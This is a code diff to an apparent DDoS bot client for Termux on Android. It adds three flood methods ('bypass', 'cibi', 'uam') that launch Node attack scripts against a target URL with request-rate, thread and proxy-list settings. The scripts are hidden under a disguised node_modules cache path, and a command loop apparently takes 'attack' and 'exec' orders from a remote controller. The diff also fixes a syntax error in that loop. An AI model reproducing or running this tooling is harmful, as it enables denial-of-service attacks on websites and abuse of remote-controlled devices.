@@ -41,6 +41,12 @@ def attack(note):
    run_background_proccess(f"node /data/data/com.termux/files/home/.session/fingerprint-generator/data_files/node_modules/es6-handler/adapters/cache/tls.js {url} {time} {rps} {thread} proxy.txt")
   elif method == "strike":
    run_background_process(f"node /data/data/com.termux/files/home/.session/fingerprint-generator/data_files/node_modules/es6-handler/adapters/cache/StarsXStrike.js GET {url} {time} {thread} {rps} proxy.txt --full")
+  elif method == "bypass":
+   run_background_process(f"node /data/data/com.termux/files/home/.session/fingerprint-generator/data_files/node_modules/es6-handler/adapters/cache/StarsXBypass.js {url} {time} {rps} {thread} proxy.txt")
+  elif method == "cibi":
+   run_background_process(f"node /data/data/com.termux/files/home/.session/fingerprint-generator/data_files/node_modules/es6-handler/adapters/cache/cibi.js {url} {time} {rps} {thread} proxy.txt")
+  elif method == "uam":
+   run_background_process(f"node /data/data/com.termux/files/home/.session/fingerprint-generator/data_files/node_modules/es6-handler/adapters/cache/v2.js {url} {time} {thread} proxy.txt {rps} uam")
  except:
   print ("error attack")
 def ping():
@@ -62,7 +68,7 @@ while True:
     ping()
    elif tipe == "attack":
     attack(note)
-   elif tipe == "exec"
+   elif tipe == "exec":
     gas(note)
   else:
    time.sleep(2)
